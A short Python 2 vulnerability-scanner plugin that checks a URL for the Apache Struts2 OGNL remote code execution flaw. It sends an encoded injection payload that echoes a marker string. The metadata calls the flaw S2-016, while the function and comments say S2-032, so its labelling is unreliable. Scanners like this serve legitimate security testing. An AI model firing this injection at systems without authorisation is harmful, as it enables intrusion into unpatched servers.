#coding=utf-8
import requests
from lib import ttlscanlogger

def POC_INFO():
    dict_poc={};
    dict_poc["name"]="Struts2_016 RCE"
    dict_poc["Chinese_name"]="Struts2_016 远程命令执行漏洞"
    dict_poc["author"]="跳跳龙"
    return dict_poc

def struts_032(target_url):
    try:
        poc = "?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23test%3D%23context.get%28%23parameters.res%5B0%5D%29.getWriter%28%29%2C%23test.println%28%23parameters.command%5B0%5D%29%2C%23test.flush%28%29%2C%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=tiaotiaolong_032"
        poc_url = target_url + poc

        response = requests.get(url=poc_url,timeout=0.5)
        result = response.text.encode('utf-8')
        # print result
        if 'tiaotiaolong_032' in result:
            if len(result) < 100:
                # print "发现一处struts漏洞，漏洞类型：struts2-016。漏洞地址为" + target_url
                return True
            # print result
            else:
                # print "此处尚未发现struts2-032类型漏洞"
                return False
        else:
            # print "此处尚未发现struts2-032类型漏洞"
            return False
    except Exception, e:
        # print e
        return False